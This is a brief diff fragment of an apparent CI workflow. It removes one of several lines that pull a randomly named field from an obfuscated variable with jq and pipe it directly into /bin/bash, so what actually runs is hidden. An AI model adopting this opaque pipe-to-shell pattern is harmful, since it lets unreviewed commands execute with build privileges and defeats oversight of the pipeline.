@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$vd98431" | jq -r .tgqgc04404 | /bin/bash
           echo $rla8 | jq -r .uvc18 | /bin/bash
           echo $vzvy09 | jq -r .smqwi0 | /bin/bash
-          echo $yfugr28 | jq -r .ng0 | /bin/bash
 
       - name: Save archive
         if: always()
